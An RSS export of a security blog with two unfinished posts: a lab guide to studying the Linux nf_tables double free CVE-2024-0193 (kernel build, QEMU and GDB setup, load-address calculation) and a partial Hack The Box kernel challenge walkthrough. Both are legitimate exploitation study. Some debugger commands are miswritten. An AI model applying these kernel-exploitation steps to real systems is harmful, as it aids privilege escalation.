<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Kvn11</title><link>https://Kvn11.github.io/</link><description>Recent content on Kvn11</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 04 Jul 2024 02:45:01 -0700</lastBuildDate><atom:link href="https://Kvn11.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Intro To Kernel Exploitation - CVE-2024-0193_cos</title><link>https://Kvn11.github.io/p/intro-to-kernel-exploitation-cve-2024-0193_cos/</link><pubDate>Thu, 04 Jul 2024 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/intro-to-kernel-exploitation-cve-2024-0193_cos/</guid><description>&lt;img src="https://i.pinimg.com/564x/05/2e/8d/052e8d59f511fd32a620ce1d12da0aa3.jpg" alt="Featured image of post Intro To Kernel Exploitation - CVE-2024-0193_cos" />&lt;h1 id="setup">Setup
&lt;/h1>&lt;p>Link to the original vulnerability report can be found &lt;a class="link" href="https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2024-0193_cos/metadata.json" target="_blank" rel="noopener"
>here&lt;/a>.a&lt;/p>
&lt;h2 id="setting-up-environment">Setting up environment
&lt;/h2>&lt;p>To get up and running as quick as possible, setup your environment as follows:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt update
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo apt install -y &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>python3 python3-pip python3-venv &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>bc binutils bison dwarves flex gcc git gnupg2 gzip libelf-dev libncurses5-dev libssl-dev make openssl dwarves perl-base rsync tar xz-utils &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>libguestfs-tools &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>tmux &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>gdb &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>qemu qemu-kvm bridge-utils
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Then download the most recent affected &lt;a class="link" href="https://github.com/torvalds/linux/releases/tag/v6.7-rc8" target="_blank" rel="noopener"
>version&lt;/a>:&lt;/p>
&lt;h3 id="building">Building
&lt;/h3>&lt;p>Make a default config with:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">make defconfig
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>and then &lt;code>nf_tables&lt;/code> support with:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">CONFIG_NETFILTER=y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG_NF_TABLES=y
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I also have a working config &lt;a class="link" href="https://github.com/kvn11" target="_blank" rel="noopener"
>here&lt;/a> (will add soon once post is finished).&lt;/p>
&lt;p>Then build the kernel with:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">make -j&lt;span class="k">$(&lt;/span>nproc&lt;span class="k">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Then we also need to setup directories for &lt;code>libguestfs&lt;/code> to work properly.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">make modules
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make modules_install
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Then&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cp arch/x86/boot/bzImage /lib/modules/6.7.0-rc8/vmlinuz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo chmod +r /lib/modules/6.7.0-rc8/vmlinuz
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Then run this script:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">virt-customize -a ubuntu-24.04-minimal-cloudimg-amd64.img &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> --root-password password:root &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> --ssh-inject pwn:file:/home/jp3g/.ssh/id_rsa.pub &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> --run-command &lt;span class="s1">&amp;#39;useradd -m -s /bin/bash pwn&amp;#39;&lt;/span> &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> --password pwn:password:abc123 &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> --ssh-inject root:file:/home/jp3g/.ssh/id_rsa.pub
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This will create an unprivileged user as well as set passwords.&lt;/p>
&lt;h3 id="getting-exploit">Getting Exploit
&lt;/h3>&lt;p>Download Google&amp;rsquo;s &lt;code>security-research&lt;/code> repo into your host, and modify &lt;code>pocs/linux/kernelctf/CVE-2024-0193_cos/exploit/cos-105-17412.226.52/Makefile&lt;/code> by adding &lt;code>-g&lt;/code> to &lt;code>CFLAGS&lt;/code> and removing the &lt;code>-s&lt;/code> flag.
Then copy it over to your qemu container with:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">virt-customize -a ubuntu-20.04-minimal-cloudimg-amd64.img &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>--copy-in /path/to/security-research/pocs/linux/kernelctf/CVE-2024-0193_cos/exploit/cos-105-17412.226.52/:/home/pwn/exploit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="gdb-and-qemu">GDB and QEMU
&lt;/h3>&lt;p>Follow this &lt;a class="link" href="https://code.lardcave.net/2019/07/20/1/" target="_blank" rel="noopener"
>guide&lt;/a> to create a bridged network between qemu and your host.&lt;/p>
&lt;p>In order to connect GDB to this container, run the following command and login as root:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">qemu-system-x86_64 -m 3.5G -nographic -no-reboot &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -enable-kvm -cpu host -smp &lt;span class="nv">cores&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">2&lt;/span> &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -kernel bzImage &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -drive &lt;span class="nv">file&lt;/span>&lt;span class="o">=&lt;/span>./ubuntu-24.04-minimal-cloudimg-amd64.img &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -nic bridge,br&lt;span class="o">=&lt;/span>br0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -nographic &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -append &lt;span class="s2">&amp;#34;root=/dev/sda1 rw console=ttyS0&amp;#34;&lt;/span> &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -s
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Once inside, run:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ip link &lt;span class="nb">set&lt;/span> enp0s3 up
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dhclient enp0s3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This should give you an IP address.
Now we have to install gdb for debugging userspace code.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">apt install &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> binutils &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> gdb &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> build-essential &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> pkg-config
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Then build the exploit from whatever directory you copied it into:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">make prerequisites
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make exploit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Then run gdb:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">gdb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>gdb&lt;span class="o">)&lt;/span> remote target localhost:1234
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="getting-load-address">Getting load address
&lt;/h3>&lt;p>Next, we have load the symbols from &lt;code>vmlinux&lt;/code> into gdb at the correct address.
After you have gotten a shell in qemu as root, run:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat /proc/kallsyms &lt;span class="p">|&lt;/span> grep strncpy_from_user
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This will give you the address of the &lt;code>strncpy_from_user&lt;/code> function.
You can of course use any function, but this is the one I chose for my example.
You will see the address at which the function is loaded.
I know from my own testing and calculations that &lt;code>strncpy_from_user&lt;/code> is &lt;code>0x548170&lt;/code> bytes from the load address.
So whatever address you got from &lt;code>kallsyms&lt;/code>, just subtract this amount from it, and you will get your load address.&lt;/p>
&lt;p>Then you can load in the symbols file with:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>gdb&lt;span class="o">)&lt;/span> add-symbols-file ./vmlinux &amp;lt;load address&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="background">Background
&lt;/h1>&lt;p>So I will be using the following versions:&lt;/p>
&lt;ul>
&lt;li>&lt;code>libnftnl&lt;/code> : &lt;a class="link" href="https://git.netfilter.org/libnftnl/tag/?h=libnftnl-1.2.6" target="_blank" rel="noopener"
>libnftnl-1.2.6&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="pipapo">pipapo
&lt;/h2>&lt;p>&amp;ldquo;Pipelined Adaptive Packet Process&amp;rdquo;, and a pipapo set refers to a specific data struct used for efficiently storing and looking up elements.
It provides fast lookup and is built for handling large sets of elements.&lt;/p>
&lt;h2 id="nftnl_table">nftnl_table
&lt;/h2>&lt;h2 id="ntfnl_table_set_str">ntfnl_table_set_str
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">EXPORT_SYMBOL&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">nftnl_table_set_str&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">nftnl_table_set_str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">nftnl_table&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">uint16_t&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">str&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nf">nftnl_table_set_data&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">str&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">str&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="vulnerability">Vulnerability
&lt;/h1>&lt;p>In the exploit given, the creates sets &lt;code>set1&lt;/code> and &lt;code>set2&lt;/code>, with catchall elements &lt;code>set1_elem&lt;/code> and &lt;code>set2_elem&lt;/code> respectively.
They are then deleted by building and sending a &lt;code>NFT_MSG_DELSET&lt;/code> type Netlink message, which deactivates the data of the set elements.
Then the catchall element should be GC&amp;rsquo;d (garbage collected), which deactivates its data again, resulting ins a double free.&lt;/p>
&lt;p>This is achieved by setting a short timeout on a set element.
Timeouts determine how long that element needs to stay in the set before it gets automatically removed.
Then create the delay.
Then delete the vulnerable pipapo set.
We can break it down in GDB to match the sections in the original disclosure.&lt;/p>
&lt;h2 id="triggering">Triggering:
&lt;/h2>&lt;p>Set breakpoints at &lt;code>nftnl_set_alloc&lt;/code>.&lt;/p>
&lt;h1 id="exploitation">Exploitation
&lt;/h1></description></item><item><title>Kernel Adventures Part II</title><link>https://Kvn11.github.io/p/kernel-adventures-part-ii/</link><pubDate>Mon, 08 Apr 2024 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/kernel-adventures-part-ii/</guid><description>&lt;img src="https://i.pinimg.com/originals/d8/73/c9/d873c94e242bafe6bbcfa83cde3b8b42.jpg" alt="Featured image of post Kernel Adventures Part II" />&lt;h2 id="setup">Setup
&lt;/h2>&lt;p>WORK IN PROGRESS&amp;hellip;&lt;/p>
&lt;p>This is the solution for HTB&amp;rsquo;s &lt;code>Kernel Adventures: Part II&lt;/code>, and in the process, we can learn and get an introduction to kernel exploitation.&lt;/p>
&lt;p>After you download the challenge, just follow the instructions in the README to get the required version of the linux kernel installed so we can take a look in our code editor.
However, you may get an error during the &lt;code>git apply&lt;/code> command.
To resolve these, you first need to run &lt;code>git checkout ff1ffd71d5f0612cf194f5705c671d6b64bf5f91&lt;/code> to revert the repo to the commit in which the vulnerability was introduced.
Now we have the code for the vulnerable kernel, and the author provided the image meant for the challenge.&lt;/p>
&lt;h2 id="goals">Goals
&lt;/h2>&lt;p>So I will take 2 approaches here.
The first is to do a code review to find the vuln by hand (eyes).
Then I want to build a fuzzer to automate the finding.&lt;/p>
&lt;h2 id="finding-vulnerability">Finding Vulnerability
&lt;/h2>&lt;p>So my first approach here is to look at the &lt;code>patch.diff&lt;/code> file to see what was changed.
There was a folder &lt;code>magic/&lt;/code> that was added.
Also, there is a new syscall &lt;code>magic&lt;/code> added to &lt;code>arch/x86/entry/syscalls/syscall_64.tbl&lt;/code>
However, the &amp;ldquo;meat&amp;rdquo; of the challenge is in &lt;code>magic/magic.c&lt;/code>, which fleshes out the syscall.&lt;/p>
&lt;p>Lets walkthrough what the new syscall does.
First it will initialize itself via the &lt;code>do_init()&lt;/code> function, but only if the &lt;code>initialized&lt;/code> value is not 0.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">do_init&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;root&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;password&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">MagicUser&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">spin_lock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">magic_lock&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">root&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">kzalloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">MagicUser&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">GFP_KERNEL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">uid&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">val&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">children&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">kzalloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">MagicUser&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">CHILDLIST_SIZE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">GFP_KERNEL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">magic_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">nextId&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">initialized&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
